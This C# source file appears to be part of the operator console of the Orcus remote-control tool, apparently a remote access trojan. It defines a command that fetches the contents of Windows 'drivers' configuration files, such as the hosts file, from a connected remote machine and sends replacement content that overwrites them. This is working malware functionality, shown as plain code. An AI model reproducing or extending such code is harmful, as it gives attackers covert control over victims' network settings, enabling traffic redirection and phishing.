using System;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.WindowsDrivers;

namespace Orcus.Administration.Commands.WindowsDrivers
{
    [DescribeCommandByEnum(typeof(WindowsDriversCommunication))]
    public class WindowsDriversCommand : Command
    {
        public event EventHandler<DriversFileContentReceivedEventArgs> DriversFileContentReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((WindowsDriversCommunication) parameter[0])
            {
                case WindowsDriversCommunication.ResponseDriversFileContent:
                    DriversFileContentReceived?.Invoke(this,
                        new DriversFileContentReceivedEventArgs(
                            Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2),
                            (WindowsDriversFile) parameter[1]));

                    LogService.Receive(
                        string.Format((string) Application.Current.Resources["DriverConfigurationFileReceived"],
                            (WindowsDriversFile) parameter[1]));
                    break;
                case WindowsDriversCommunication.ResponseChangedSuccessfully:
                    LogService.Receive((string) Application.Current.Resources["ConfigurationFileSaved"]);
                    break;
                case WindowsDriversCommunication.ResponseChangingFailed:
                    LogService.Error(
                        string.Format((string) Application.Current.Resources["SavingConfigurationFileFailed"],
                            Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetAllDriverFiles()
        {
            ConnectionInfo.SendCommand(this, (byte) WindowsDriversCommunication.GetAllDriversFiles);

            LogService.Send((string) Application.Current.Resources["GetAllDriverConfigurationFiles"]);
        }

        public void GetDriversFile(WindowsDriversFile windowsDriversFile)
        {
            ConnectionInfo.SendCommand(this,
                new[] {(byte) WindowsDriversCommunication.GetDriversFile, (byte) windowsDriversFile});

            LogService.Send(string.Format((string) Application.Current.Resources["GetDriverConfigurationFile"],
                windowsDriversFile));
        }

        public void EditDriversFile(WindowsDriversFile windowsDriversFile, string content)
        {
            var contentData = Encoding.UTF8.GetBytes(content);
            var packet = new byte[contentData.Length + 2];
            packet[0] = (byte) WindowsDriversCommunication.ChangeDriversFile;
            packet[1] = (byte) windowsDriversFile;
            Buffer.BlockCopy(contentData, 0, packet, 2, contentData.Length);

            ConnectionInfo.SendCommand(this, packet);

            LogService.Send(string.Format((string) Application.Current.Resources["SaveConfigurationFile"],
                windowsDriversFile));
        }

        protected override uint GetId()
        {
            return 9;
        }
    }
}